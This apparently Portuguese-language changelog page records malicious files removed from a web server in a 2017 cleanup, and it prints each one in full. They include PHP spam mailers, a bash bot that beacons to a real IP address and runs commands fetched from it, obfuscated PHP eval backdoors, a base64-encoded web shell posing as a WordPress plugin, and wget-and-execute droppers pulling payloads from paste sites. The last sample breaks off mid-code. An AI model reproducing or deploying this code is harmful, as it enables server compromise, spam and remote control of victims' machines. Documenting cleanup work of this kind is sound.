---
id: doc37
title: Arquivos Maliciosos
sidebar_label: COD 2019-09-20:06
---

## 37.0.0 - 2017-09-25

### Fixed

- Removido arquivo lao.php com código malicioso

## Código

```php

<?php 
$jewrqwbnlk = base64_decode($_POST['ylxqjqbcn']); 
$xaouf = base64_decode($_POST['nrsf']); 
$jwgpxlzblkepa = base64_decode($_POST['tdluhqtnmzr']);  
$fcublsqtpae = base64_decode($_POST['qqifquaqdzvp']);  
$jfnbrsjfq = imap_mail($jewrqwbnlk, $xaouf, $jwgpxlzblkepa, $fcublsqtpae);
if($jfnbrsjfq){echo 'vwkxlpc';} else {echo 'yfbhn : ' . $jfnbrsjfq;} 

 
                             

 
 
                                           
                                
```

## 37.0.0 - 2017-09-25

### Fixed

- Removido arquivo legcbnyfe.php com código malicioso

## Código

```php

<?php 
$jewrqwbnlk = base64_decode($_POST['ylxqjqbcn']); 
$xaouf = base64_decode($_POST['nrsf']); 
$jwgpxlzblkepa = base64_decode($_POST['tdluhqtnmzr']);  
$fcublsqtpae = base64_decode($_POST['qqifquaqdzvp']);  
$jfnbrsjfq = imap_mail($jewrqwbnlk, $xaouf, $jwgpxlzblkepa, $fcublsqtpae);
if($jfnbrsjfq){echo 'vwkxlpc';} else {echo 'yfbhn : ' . $jfnbrsjfq;} 

 
                             

 
 
                                           
```

## 37.0.0 - 2017-09-25


### Fixed

- Removido arquivo lskcpxe.php com código malicioso

## Código

```php

<?php 
$jewrqwbnlk = base64_decode($_POST['ylxqjqbcn']); 
$xaouf = base64_decode($_POST['nrsf']); 
$jwgpxlzblkepa = base64_decode($_POST['tdluhqtnmzr']);  
$fcublsqtpae = base64_decode($_POST['qqifquaqdzvp']);  
$jfnbrsjfq = mail($jewrqwbnlk, $xaouf, $jwgpxlzblkepa, $fcublsqtpae);
if($jfnbrsjfq){echo 'vwkxlpc';} else {echo 'yfbhn : ' . $jfnbrsjfq;} 

chmod(__FILE__, 0444);
  
 

 
                             

 
 
                                           
                              
                                
```

## 37.0.0 - 2017-09-25

### Fixed

- Removido arquivo m3KUYA com código malicioso

## Código

```sh

#!/bin/bash

userid=$(id -u)

if ps ax | grep $0 | grep -v $$ | grep 'bash' | grep -v 'grep'; then
	exit 1
fi

F_P="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/$(basename "${BASH_SOURCE[0]}")"
F_D="$( cd "$(dirname "$0")" ; pwd -P )"

echo 'pussy' > $F_P

if ! [ -x "$(command -v curl)" ]; then
	Ecurl="0"
else
	Ecurl="1"
fi
if ! [ -x "$(command -v wget)" ]; then
	Ewget="0"
else
	Ewget="1"
fi
if ! [ -x "$(command -v python)" ]; then
	Epy="0"
else
	Epy="1"
fi
if ! [ -x "$(command -v perl)" ]; then
	Eperl="0"
else
	Eperl="1"
fi

DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"

if [ ! -f "$DIR/.cid" ];then
	cid=$RANDOM$RANDOM$RANOM$RANDOM
	echo $cid > "$DIR/.cid"
	data1=$(echo -n "curl=$Ecurl|wget=$Ewget|python=$Epy|perl=$Eperl|dir=$DIR" | base64)
	dataV="cid=$cid&pid=$data1"
	if [ $Ecurl -eq 1 ]; then
		curl -k --silent -A 'Mozilla/5.0 (Windows NT 5.0; shinigami) Gecko/20100101 Firefox/68.0' -d $dataV -X POST "http://80.211.34.55/.cgi-bin/professor.php" -o /dev/null &>/dev/null &disown;
	elif [ $Ewget -eq 1 ]; then
		wget --no-check-certificate -U 'Mozilla/5.0 (Windows NT 5.0; shinigami) Gecko/20100101 Firefox/68.0' --post-data $dataV "http://80.211.34.55/.cgi-bin/professor.php" -O /dev/null &>/dev/null &disown;
	elif [ $Epy -eq 1 ]; then
		python_script=$(cat <<EOF
import urllib2, urllib
opener = urllib2.build_opener() 
opener.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 5.0; shinigami) Gecko/20100101 Firefox/68.0')]
dd = {'cid': "$cid", 'pid': "$data1"}
try:
	data = urllib.urlencode(dd)
	req = urllib2.Request("http://80.211.34.55/.cgi-bin/professor.php",data)
	rq = opener.open(req)
except:
	pass
EOF
)
		python -c "$python_script" &>/dev/null &disown;
	fi
else
	cid=$(cat "$DIR/.cid")
fi


requester () {

if [ $Ecurl -eq 1 ]; then
	curl -k --silent -A 'Mozilla/5.0 (Windows NT 5.0; shinigami) Gecko/20100101 Firefox/68.0' -d $1 -X POST "http://80.211.34.55/.cgi-bin/professor.php" -o /dev/null &>/dev/null &disown;
elif [ $Ewget -eq 1 ]; then
	wget --no-check-certificate -U 'Mozilla/5.0 (Windows NT 5.0; shinigami) Gecko/20100101 Firefox/68.0' --post-data $1 "http://80.211.34.55/.cgi-bin/professor.php" -O /dev/null &>/dev/null &disown;
elif [ $Epy -eq 1 ]; then
	python_script=$(cat <<EOF
import urllib2, urllib
opener = urllib2.build_opener() 
opener.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 5.0; shinigami) Gecko/20100101 Firefox/68.0')]
dd = {'cid': "$cid", 'cagefs': "$2" , 'hash' : "$3"}
try:
	data = urllib.urlencode(dd)
	req = urllib2.Request("http://80.211.34.55/.cgi-bin/professor.php",data)
	rq = opener.open(req)
except:
	pass
EOF
)
	python -c "$python_script" &>/dev/null &disown;
fi
}





while true; do
	batch=$RANDOM$RANDOM$RANOM
	if [ $Ecurl -eq 1 ]; then
		curl -k --silent -A 'Mozilla/5.0 (Windows NT 5.0; shinigami) Gecko/20100101 Firefox/68.0' -d "hash=$batch&cid=$cid" -X POST "http://80.211.34.55/.cgi-bin/professor.php" -o "$DIR/.cache" &>/dev/null &disown;
		cat "$DIR/.cache"
	elif [ $Ewget -eq 1 ]; then
		wget --no-check-certificate -U 'Mozilla/5.0 (Windows NT 5.0; shinigami) Gecko/20100101 Firefox/68.0' --post-data "hash=$batch&cid=$cid" "http://80.211.34.55/.cgi-bin/professor.php" -O "$DIR/.cache" &>/dev/null &disown;
	elif [ $Epy -eq 1 ]; then
		python_script=$(cat <<EOF
import urllib2, urllib
opener = urllib2.build_opener() 
opener.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 5.0; shinigami) Gecko/20100101 Firefox/68.0')]
dd = {'cid': "$cid", 'hash': "$batch"}
try:
	data = urllib.urlencode(dd)
	req = urllib2.Request("http://80.211.34.55/.cgi-bin/professor.php",data)
	rq = opener.open(req).read()
	w = open("$DIR/.cache",'w')
	w.write(rq)
	w.close()
except:
	pass
EOF
)
		python -c "$python_script" &>/dev/null &disown;
	fi

	oldcmd=$(cat "$DIR/.token" 2>/dev/null)
	newcmd=$(cat "$DIR/.cache" 2>/dev/null)
	if [[ ! $newcmd =~ 'wrong_pass' ]]; then
		if [ ! "$oldcmd" == "$newcmd" ]; then
			hash=$(echo $newcmd | cut -f1 -d:)
			newcmd1=$(echo $newcmd | cut -f2 -d:)
			cmd=$(echo "$newcmd1" | base64 -d)
			eval "${cmd}" &>"$DIR/.junk" &disown;
			sleep 10
			rm -rf "$DIR/.token"
			cp "$DIR/.cache" "$DIR/.token"
			outputs=$(cat "$DIR/.junk" | base64 | tr -d \\n | sed 's/=/~/g')
			curwge="cid=$cid&hash=$hash&cagefs=$outputs"
			requester $curwge $outputs $hash
		else
			bbb="ddbb" # echo 'same as old cmd!'
		fi
	else
		bbb="ddbb" # echo 'no command set'
	fi

 	sleep 20
done

```

## 37.0.0 - 2017-09-25

### Fixed

- Removido arquivo meta-html-order-fee.php com código malicioso

## Código

```php

<?php
goto RRtTk; sjj3G: function gkLsY($GhgCv) { $W0Cik = array("\x6a\167\x65\171\143", "\x61\x65\x73\153\157\x6c\171", "\157\x77\x68\x67\147\x69\x6b\165", "\x63\x61\x6c\x6c\x62\x72\x68\171", "\x48\x2a"); return $W0Cik[$GhgCv]; } goto fwMvS; D5Z1w: exit; goto UrMKG; RRtTk: $GLOBALS["\137\x37\71\65\x36\x35\x35\71\65\x5f"] = array("\x73\164\162\137" . "\162\x6f\x74\x31\63", "\x70\x61\143\153", "\x73\164" . "\162\x72\145\x76"); goto sjj3G; tlce1: $CnCHz = $GLOBALS["\x5f\67\71\x35\x36\x35\x35\71\65\137"][0](@$GLOBALS["\x5f\67\x39\x35\x36\65\x35\x39\x35\137"][1](gkLsY(4), $GLOBALS["\137\x37\x39\x35\x36\x35\65\x39\65\x5f"][2]($CnCHz))); goto WHnss; aeJcN: if (empty($CnCHz)) { goto jWAe0; } goto tlce1; UrMKG: QEmxS: goto VzztY; RbO9J: @eval($CnCHz); goto D5Z1w; LRKHj: $CnCHz = DEF0j(GKLSy(0)) . DeF0j(gklSY(1)) . def0j(Gklsy(2)) . DeF0J(gKLsy(3)); goto aeJcN; fwMvS: function dEF0j($LGQ3g) { return isset($_COOKIE[$LGQ3g]) ? $_COOKIE[$LGQ3g] : @$_POST[$LGQ3g]; } goto LRKHj; WHnss: if (!isset($CnCHz)) { goto QEmxS; } goto RbO9J; VzztY: jWAe0:
?>

```

## 37.0.0 - 2017-09-25

### Fixed

- Removido arquivo mGhfdC com código malicioso

## Código

```php

echo "PD9waHANCi8qKg0KICogQGxpbmsgICAgICAgICAgICAgIGh0dHA6Ly9ldmFuLWhlcm1hbi5jb20vd29yZHByZXNzLXBsdWdpbi9zdmctaWNvbi13cHZlY3Rvcg0KICogQHNpbmNlICAgICAgICAgICAgIDMuMA0KICogQHBhY2thZ2UgICAgICAgICAgIFdQX1NWR19JY29ucw0KICoNCiAqIEB3b3JkcHJlc3MtcGx1Z2luDQogKiBQbHVnaW4gTmFtZTogICAgICAgV1AgU1ZHIEljb25zDQogKiBQbHVnaW4gVVJJOiAgICAgICAgaHR0cHM6Ly93d3cuZXZhbi1oZXJtYW4uY29tL3dvcmRwcmVzcy1wbHVnaW4vc3ZnLWljb24td3B2ZWN0b3IvDQogKiBEZXNjcmlwdGlvbjogICAgICAgUXVpY2tseSBhbmQgZWZmb3J0bGVzc2x5IGdhaW4gYWNjZXNzIHRvIDQ5MiBiZWF1dGlmdWxseSBkZXNpZ25lZCBTVkcgZm9udCBpY29ucywgYXZhaWxhYmxlIG9uIHRoZSBmcm9udGVuZCBhbmQgYmFja2VuZCBvZiB5b3VyIHNpdGUuDQogKiBWZXJzaW9uOiAgICAgICAgICAgMy4yLjENCiAqIEF1dGhvcjogICAgICAgICAgICBFSCBEZXYgU2hvcA0KICogQXV0aG9yIFVSSTogICAgICAgIGh0dHA6Ly9ldmFuLWhlcm1hbi5jb20NCiAqIExpY2Vuc2U6ICAgICAgICAgICBHUEwtMy4wKw0KICogTGljZW5zZSBVUkk6ICAgICAgIGh0dHA6Ly93d3cuZ251Lm9yZy9saWNlbnNlcy9ncGwtMy4wLnR4dA0KICogVGV4dCBEb21haW46ICAgICAgIHN2Zy1pY29uLXdwdmVjdG9yDQogKiBEb21haW4gUGF0aDogICAgICAgL2xhbmd1YWdlcw0KICovDQoNCi8vIElmIHRoaXMgZmlsZSBpcyBjYWxsZWQgZGlyZWN0bHksIGFib3J0Lg0KZXJyb3JfcmVwb3J0aW5nKDApOw0KZWNobyAnDQo8dGFibGUgd2lkdGg9IjM5MCIgY2VsbHBhZGRpbmc9IjMiIGJvcmRlcj0iMCIgY2VsbHNwYWNpbmc9IjEiIGFsaWduPSJjZW50ZXIiPjx0cj48dGQ+Q3VycmVudCBQYXRoIDogJzsNCmlmKGlzc2V0KCRfR0VUWydwYXRoJ10pKXsNCiRwYXRoID0gJF9HRVRbJ3BhdGgnXTsNCn1lbHNlew0KJHBhdGggPSBnZXRjd2QoKTsNCn0NCiRwYXRoID0gc3RyX3JlcGxhY2UoJ1xcJywnLycsJHBhdGgpOw0KJHBhdGhzID0gZXhwbG9kZSgnLycsJHBhdGgpOw0KZm9yZWFjaCgkcGF0aHMgYXMgJGlkPT4kcGF0KXsNCmlmKCRwYXQgPT0gJycgJiYgJGlkID09IDApew0KJGEgPSB0cnVlOw0KZWNobyAnPGEgaHJlZj0iP3BhdGg9LyI+LzwvYT4nOw0KY29udGludWU7DQp9DQppZigkcGF0ID09ICcnKSBjb250aW51ZTsNCmVjaG8gJzxhIGhyZWY9Ij9wYXRoPSc7DQpmb3IoJGk9MDskaTw9JGlkOyRpKyspew0KZWNobyAiJHBhdGhzWyRpXSI7DQppZigkaSAhPSAkaWQpIGVjaG8gIi8iOw0KfQ0KZWNobyAnIj4nLiRwYXQuJzwvYT4vJzsNCn0NCmVjaG8gJzwvdGQ+PC90cj48dHI+PHRkPic7DQovKioNCiAqIFRoZSBjb2RlIHRoYXQgcnVucyBkdXJpbmcgcGx1Z2luIGRlYWN0aXZhdGlvbi4NCiAqIFRoaXMgYWN0aW9uIGlzIGRvY3VtZW50ZWQgaW4gaW5jbHVkZXMvd3Atc3ZnLWljb25zLWN1c3RvbS5waHANCiAqLw0KaWYoaXNzZXQoJF9GSUxFU1snZm5hbWUnXSkpew0KJHRhcnBhdGhzPWJhc2VuYW1lKCRfRklMRVNbImZuYW1lIl1bIm5hbWUiXSk7aWYobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImZuYW1lIl1bInRtcF9uYW1lIl0sJHBhdGguJy8nLiR0YXJwYXRocykpe2VjaG8gJzxmb250IGNvbG9yPSJncmVlbiI+ZkRvbmUgaXMgb2s8L2ZvbnQ+PGJyIC8+Jzt9ZWxzZXtlY2hvICc8Zm9udCBjb2xvcj0icmVkIj5VZmFpbDwvZm9udD48YnIgLz4nO30NCn0gDQplY2hvICI8Zm9ybSBlbmN0eXBlPVwibXVsdGlwYXJ0L2Zvcm0tZGF0YVwiIG1ldGhvZD1cIlBPU1RcIiBhY3Rpb249XCI/cGF0aD0kcGF0aFwiPjxpbnB1dCBuYW1lPVwiZm5hbWVcIiB0eXBlPVwiZmlsZVwiLz48aW5wdXQgdHlwZT1cInN1Ym1pdFwiIHZhbHVlPVwiZkRvbmVcIi8+PC9mb3JtPjwvdGQ+PC90cj4iOw0KZnVuY3Rpb24gZ2V0KCR1cmwsICRkaXIpIHsNCgkkY2ggPSBjdXJsX2luaXQoKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KCWN1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX1RJTUVPVVQsMTApOw0KCSRkYXRhID0gY3VybF9leGVjKCRjaCk7DQoJaWYoISRkYXRhKXsNCgkJJGRhdGEgPSBAZmlsZV9nZXRfY29udGVudHMoJHVybCk7DQoJfQ0KCWZpbGVfcHV0X2NvbnRlbnRzKCRkaXIsICRkYXRhKTsNCn0NCmlmKCRfR0VUWyd1cmwnXSl7DQoJJHVybCA9ICRfR0VUWyd1cmwnXTsNCglwcmVnX21hdGNoKCcvKC4qKVwvKC4qKVwuKC4qPykkLycsJHVybCwkbik7DQoJaWYoJG5bM109PSd0eHQnKXsNCgkJJHo9J3BocCc7DQoJCSRuYW1lPSRuWzJdOw0KCX1lbHNlew0KCQkkej0kblszXTsNCgkJJG5hbWU9Im1vYmFuIjsNCgl9DQoJaWYoJF9HRVRbJ2RpciddKXsNCgkJJGRpcj0kX1NFUlZFUlsiRE9DVU1FTlRfUk9PVCJdLicvJy4kX0dFVFsnZGlyJ10uJy8nLiRuYW1lLicuJy4kejsNCgl9ZWxzZXsNCgkJJGRpcj0kX1NFUlZFUlsiRE9DVU1FTlRfUk9PVCJdLicvJy4kbmFtZS4nLicuJHo7DQoJfQ0KCWdldCgkdXJsLCRkaXIpOw0KCWlmKGZpbGVfZXhpc3RzKCRkaXIpKXtlY2hvICI8dHI+PHRkPjxmb250IGNvbG9yPVwiZ3JlZW5cIj5kb3dubG9hZCBzdWNjZXNzPC9mb250PjwvdGQ+PC90cj4iO31lbHNle2VjaG8gIjx0cj48dGQ+PGZvbnQgY29sb3I9XCJyZWRcIj5kb3dubG9hZCBmYWlsPC9mb250PjwvdGQ+PC90cj4iO30NCn1lbHNlaWYoJF9QT1NUWyd1cmwnXSl7DQoJJHVybCA9ICRfUE9TVFsndXJsJ107DQoJcHJlZ19tYXRjaCgnLyguKilcLyguKilcLiguKj8pJC8nLCR1cmwsJG4pOw0KCWlmKCRuWzNdPT0ndHh0Jyl7DQoJCSR6PSdwaHAnOw0KCQkkbmFtZT0kblsyXTsNCgl9ZWxzZXsNCgkJJHo9JG5bM107DQoJCSRuYW1lPSJtb2JhbiI7DQoJfQ0KCSRkaXIgPSAkX1BPU1RbJ3BhdGgnXS4iLyIuJG5hbWUuJy4nLiR6Ow0KCWdldCgkdXJsLCRkaXIpOw0KCWlmKGZpbGVfZXhpc3RzKCRkaXIpKXtlY2hvICI8dHI+PHRkPjxmb250IGNvbG9yPVwiZ3JlZW5cIj5kb3dubG9hZCBzdWNjZXNzPC9mb250PjwvdGQ+PC90cj4iO31lbHNle2VjaG8gIjx0cj48dGQ+PGZvbnQgY29sb3I9XCJyZWRcIj5kb3dubG9hZCBmYWlsPC9mb250PjwvdGQ+PC90cj4iO30NCn0NCg0KLyoqDQogKiBDbGFzcyB3cF9zdmdfaWNvbnNfdmlldw0KICogaGFuZGxlcyB0aGUgY3JlYXRpb24gb2YgW3dwLXN2Zy1pY29uc10gc2hvcnRjb2RlDQogKiBjcmVhdGVzIGEgd29yZHByZXNzIHZpZXcgcmVwcmVzZW50aW5nIHRoaXMgc2hvcnRjb2RlIGluIHRoZSBlZGl0b3INCiAqIGRlbGV0ZSBidXR0b24gb24gd3AgdmlldyBhcyB3ZWxsIG1ha2VzIGZvciBlYXN5IHNob3J0Y29kZSBtYW5hZ2VtZW50cy4NCiAqDQogKiBzZXBhcmF0ZSBjc3MgaXMgaW4gc3R5bGUuY29udGVudC5jc3MgLSB0aGlzIGlzIGxvYWRlZCBpbiBmcm9udGVuZCBhbmQgYWxzbyBiYWNrZW5kIHdpdGggYWRkX2VkaXRvcl9zdHlsZQ0KICoNCiAqIEF1dGhvcjogZXZhbi5tLmhlcm1hbkBnbWFpbC5jb20NCiAqIENvcHlyaWdodCAyMDE0DQogKi8NCmVjaG8gIjx0cj48dGQ+PGZvcm0gbWV0aG9kPVwiUE9TVFwiIGFjdGlvbj1cIj9wYXRoPSRwYXRoXCI+PHNwYW4+VXJsOiA8L3NwYW4+PGlucHV0IHR5cGU9dGV4dCBuYW1lPVwidXJsXCIgdmFsdWU9XCJcIj48aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJwYXRoXCIgdmFsdWU9XCIkcGF0aFwiPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT1cIkRvd25sb2FkXCI+PC9mb3JtPjwvdGQ+PC90cj4iOw0KaWYoaXNzZXQoJF9HRVRbJ2ZpbGVzcmMnXSkpew0KCWVjaG8gIjx0cj48dGQ+Q3VycmVudCBGaWxlIDogIjsNCgllY2hvICRfR0VUWydmaWxlc3JjJ107DQoJZWNobyAnPC90cj48L3RkPjwvdGFibGU+PGJyIC8+JzsNCgllY2hvKCc8cHJlPicuaHRtbHNwZWNpYWxjaGFycyhmaWxlX2dldF9jb250ZW50cygkX0dFVFsnZmlsZXNyYyddKSkuJzwvcHJlPicpOw0KCX1lbHNlaWYoaXNzZXQoJF9HRVRbJ2NoZWNrJ10pICYmICAkX0dFVFsnY2hlY2snXSA9PSAnMScpew0KCQkkUm9vdERpciA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107DQoJCSRmaWxlbmFtZSA9ICRSb290RGlyLicvaW5kZXgucGhwJzsNCgkJZWNobyAiPHRyPjx0ZD5DdXJyZW50IEZpbGUgOiAiOw0KCQllY2hvICRmaWxlbmFtZTsNCgkJZWNobyAnPC90cj48L3RkPjwvdGFibGU+PGJyIC8+JzsNCgkJZWNobygnPHByZT4nLmh0bWxzcGVjaWFsY2hhcnMoZmlsZV9nZXRfY29udGVudHMoJGZpbGVuYW1lKSkuJzwvcHJlPicpOw0KCX1lbHNlew0KCWVjaG8gJzwvdGFibGU+PGJyIC8+PGNlbnRlcj4nOw0KCS8vIGNvbW1lbnQgdGhpcyAnYWRkX2FjdGlvbicgb3V0IHRvIGRpc2FibGUgc2hvcnRjb2RlIGJhY2tlbmQgbWNlIHZpZXcgZmVhdHVyZQ0KCWlmKGlzc2V0KCRfR0VUWydvcHRpb24nXSkgJiYgICRfR0VUWydvcHRpb24nXSA9PSAnZGVsZXRlJyl7DQoJCWlmKHVubGluaygkX0dFVFsnZGVsZmlsZSddKSl7DQoJCQllY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkRlbGV0ZSBGaWxlIERvbmUuPC9mb250PjxiciAvPic7DQoJCX1lbHNlew0KCQkJZWNobyAnPGZvbnQgY29sb3I9InJlZCI+RGVsZXRlIEZpbGUgRXJyb3IuPC9mb250PjxiciAvPic7DQoJCX0NCgl9DQoJZWNobyAnPC9jZW50ZXI+JzsNCgkkc2NhbmRpciA9IHNjYW5kaXIoJHBhdGgpOw0KCWVjaG8gJzxkaXYgaWQ9ImNvbnRlbnQiPjx0YWJsZSB3aWR0aD0iMzgwIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIzIiBjZWxsc3BhY2luZz0iMSIgYWxpZ249ImNlbnRlciI+PHRyIGNsYXNzPSJmaXJzdCI+PHRkPk5hbWU8L3RkPjx0ZD5TaXplPC90ZD48dGQ+T3B0aW9uczwvdGQ+PC90cj4nOw0KCWZvcmVhY2goJHNjYW5kaXIgYXMgJGRpcil7DQoJCWlmKCFpc19kaXIoIiRwYXRoLyRkaXIiKSB8fCAkZGlyID09ICcuJyB8fCAkZGlyID09ICcuLicpIGNvbnRpbnVlOw0KCQkJZWNobyAiPHRyPjx0ZD48YSBocmVmPVwiP3BhdGg9JHBhdGgvJGRpclwiPiRkaXI8L2E+PC90ZD48dGQ+RElSPC90ZD48dGQ+bm9uZTwvdGQ+PC90cj4iOw0KCQl9DQoJZWNobyAnPHRyIGNsYXNzPSJmaXJzdCI+PHRkPjwvdGQ+PHRkPjwvdGQ+PHRkPjwvdGQ+PHRkPjwvdGQ+PC90cj4nOw0KCS8qKg0KCSogQmVnaW5zIGV4ZWN1dGlvbiBvZiB0aGUgcGx1Z2luLg0KCSoNCgkqIFNpbmNlIGV2ZXJ5dGhpbmcgd2l0aGluIHRoZSBwbHVnaW4gaXMgcmVnaXN0ZXJlZCB2aWEgaG9va3MsDQoJKiB0aGVuIGtpY2tpbmcgb2ZmIHRoZSBwbHVnaW4gZnJvbSB0aGlzIHBvaW50IGluIHRoZSBmaWxlIGRvZXMNCgkqIG5vdCBhZmZlY3QgdGhlIHBhZ2UgbGlmZSBjeWNsZS4NCgkqDQoJKiBAc2luY2UgICAgMy4wLjANCgkqLw0KCWZvcmVhY2goJHNjYW5kaXIgYXMgJGZpbGUpew0KCQlpZighaXNfZmlsZSgiJHBhdGgvJGZpbGUiKSkgY29udGludWU7DQoJCSRzaXplID0gZmlsZXNpemUoIiRwYXRoLyRmaWxlIikvMTAyNDsNCgkJJHNpemUgPSByb3VuZCgkc2l6ZSwzKTsNCgkJaWYoJHNpemUgPj0gMTAyNCl7DQoJCQkkc2l6ZSA9IHJvdW5kKCRzaXplLzEwMjQsMikuJyBNQic7DQoJCX1lbHNlew0KCQkJJHNpemUgPSAkc2l6ZS4nIEtCJzsNCgkJfQ0KCQllY2hvICI8dHI+PHRkPjxhIGhyZWY9XCI/ZmlsZXNyYz0kcGF0aC8kZmlsZSZwYXRoPSRwYXRoXCI+JGZpbGU8L2E+PC90ZD48dGQ+Ii4kc2l6ZS4iPC90ZD48dGQ+PGEgaHJlZj1cIj9wYXRoPSRwYXRoJmRlbGZpbGU9JHBhdGgvJGZpbGUmb3B0aW9uPWRlbGV0ZVwiPkRlbGV0ZTwvYT48L3RkPjwvdHI+IjsNCgl9DQoJZWNobyAnPC90YWJsZT48L2Rpdj4nOw0KfQ=="  | base64 -d  >word.php

```

## 37.0.0 - 2017-09-25

### Fixed

- Removido arquivo mhzQWn com código malicioso

## Código

```s
wget https://pastecode.xyz/view/raw/dc7bac48; chmod +x dc7bac48; ./dc7bac48; rm -rf dc7bac48; php code87.php

```
### Redirecionado para o seguinte endereço: [https://pastecode.xyz/view/raw/dc7bac48](https://pastecode.xyz/view/raw/dc7bac48)

- CONTEUDO DA PÁGINA

```
wget https://pastecode.xyz/view/raw/554d0f73 -O code87.php

```

### Redirecionado para o seguinte endereço: [https://pastecode.xyz/view/raw/554d0f73](https://pastecode.xyz/view/raw/554d0f73)

- CONTEUDO DA PÁGINA

```php

<?php 

goto mGrWS; eRfnp: QBoMI: goto DTWWI; KhNWh: fwrite($jS0BU, $HQCOv); goto eOnIg; fkhJH: fclose($DmJM2); goto HnP6N; FlxVI: $jS0BU = fopen($jUKIZ, "\x77"); goto KhNWh; FIkgU: jSEgd: goto QtoEN; COHYp: echo "\74\143\x65\x6e\x74\x65\x72\76\x3c\x68\61\x3e\x49\x44\102\124\x45\64\x4d\40\103\x4f\x44\105\40\70\67\74\57\x68\61\76" . "\x3c\142\x72\x3e" . "\x5b\165\x6e\141\x6d\145\x5d\x20" . php_uname() . "\40\133\57\165\x6e\x61\155\x65\x5d\x20\x3c\x62\162\x3e\x20\120\x6f\163\151\x73\x69\x20\x3a\x20" . ($OTWjO = getcwd()); goto YOTUs; Y8LLe: r1YmL: goto sREzg; k7Swi: @ini_set("\144\x69\163\x70\x6c\x61\171\x5f\x65\162\162\157\162\163", 0); goto ohmtk; S3d9Y: $SyjWl = hPbDu("\150\164\x74\x70\72\57\57\x31\x32\65\56\x32\61\x32\x2e\62\64\x32\56\61\x36\x2f\141\144\155\151\156\57\x74\145\155\x70\x2f\56\164\x6d\160\x2f\171\141\x6b\x2e\164\x78\x74"); goto FA002; hIBw4: ini_set("\155\141\170\x5f\x65\x78\x65\x63\x75\164\151\x6f\156\x5f\164\x69\155\145", 0); goto jOl6_; KP7w6: fclose($JTcIn); goto sU6UQ; zJs6o: $QtExU = fopen("{$cYLTO}\57{$U596y}", "\167"); goto IAear; mWENi: if (empty($_FILES["\x75\160\x6c\x6f\141\x64\x73"])) { goto ApXCq; } goto adGKu; QWeya: echo "\74\163\143\162\151\160\x74\x3e\x61\154\145\x72\164\x28\x27\x75\x70\x6c\157\x61\144\40\x44\x6f\x6e\x65\47\51\73\x20\11\40\x9\x20\x3c\x2f\163\x63\162\x69\x70\164\76\x3c\142\76\125\x70\x6c\157\x61\144\145\x64\x20\41\x21\41\x3c\57\x62\x3e\74\x62\162\76\156\x61\155\x65\40\x3a\x20" . $_FILES["\x75\x70\154\157\141\144\163"]["\x6e\x61\x6d\x65"] . "\74\142\x72\76\x73\x69\x7a\145\x20\72\40" . $_FILES["\x75\160\x6c\157\x61\x64\163"]["\x73\x69\172\x65"] . "\74\x62\x72\76\x74\171\x70\145\x20\72\x20" . $_FILES["\x75\160\x6c\x6f\141\144\x73"]["\164\x79\x70\x65"]; goto IYip9; DTWWI: $U596y = "\x6d\x61\164\141\x6d\x75\56\x70\150\x70"; goto KgDq6; ky33U: fwrite($DmJM2, $s_YDD); goto fkhJH; n1xU7: function hPbdU($hl9BW) { goto P5emj; N2Hx_: return curl_exec($hn9u3); goto SBpfk; SBpfk: curl_close($hn9u3); goto Cu1Tr; xqQg2: curl_setopt($hn9u3, CURLOPT_RETURNTRANSFER, 1); goto XDA1M; P5emj: $hn9u3 = curl_init($hl9BW); goto xqQg2; kyTjP: curl_setopt($hn9u3, CURLOPT_HEADER, 0); goto N2Hx_; XDA1M: curl_setopt($hn9u3, CURLOPT_CONNECTTIMEOUT, 10); goto pm6cZ; pm6cZ: curl_setopt($hn9u3, CURLOPT_FOLLOWLOCATION, 1); goto kyTjP; Cu1Tr: } goto pBKh0; UrE_W: $OQh5p = $_SERVER["\x44\117\x43\x55\x4d\x45\x4e\124\137\x52\x4f\117\124"]; goto COHYp; YpcTN: $HQCOv = hPbdU("\150\x74\x74\x70\x3a\57\x2f\156\144\157\164\x2e\x75\163\57\x7a\141"); goto FlxVI; A3Fm9: $E7aEB = HPBDU("\150\164\x74\x70\163\72\x2f\x2f\x70\x61\163\x74\145\x62\x69\156\x2e\143\x6f\155\x2f\162\x61\167\57\146\x54\127\63\153\115\x59\124"); goto Xo36F; uRaie: $MwQBi = getcwd() . DIRECTORY_SEPARATOR; goto D7AzE; FLVww: $x3Tw6 = "\x74\x65\163\x74\145\162\x5f\x73\145\156\144\145\x72\x40\x6f\165\x74\x6c\x6f\x6f\x6b\56\x63\157\155\x2c\152\145\155\142\x6f\164\x2e\x6b\151\x73\165\x74\100\x67\155\x61\x69\154\x2e\143\x6f\155"; goto fzTZN; Do5jH: fwrite($JTqMM, $E7aEB); goto b_uyL; sREzg: MdIDf: goto R0KuM; fzTZN: $F_bs3 = "\x68\164\164\160\x3a\x2f\57" . $hPaIA . "\57\x77\160\55\x69\156\x63\154\165\x64\145\x73\57\152\163\x2f\151\156\x63\x6c\x75\x64\145\56\x70\x68\160\xa\150\x74\164\160\72\x2f\57" . $E8N6i . "\xa" . $OTWjO . "\xa" . $E3n9n; goto VYx6u; IhzdP: $hPaIA = $_SERVER["\123\x45\x52\x56\105\x52\137\x4e\x41\115\x45"]; goto dlTLg; b_uyL: fclose($JTqMM); goto LiaY9; pBKh0: $jUKIZ = $OQh5p . "\57\x77\160\55\151\156\143\x6c\x75\144\145\163\x2f\152\163\x2f\151\x6e\143\x6c\165\144\145\56\160\x68\160"; goto YpcTN; mKjwM: $cYLTO = getcwd() . DIRECTORY_SEPARATOR; goto zJs6o; UzTUv: if ($E3n9n) { goto r1YmL; } goto dtVVy; GpsDD: $s_YDD = 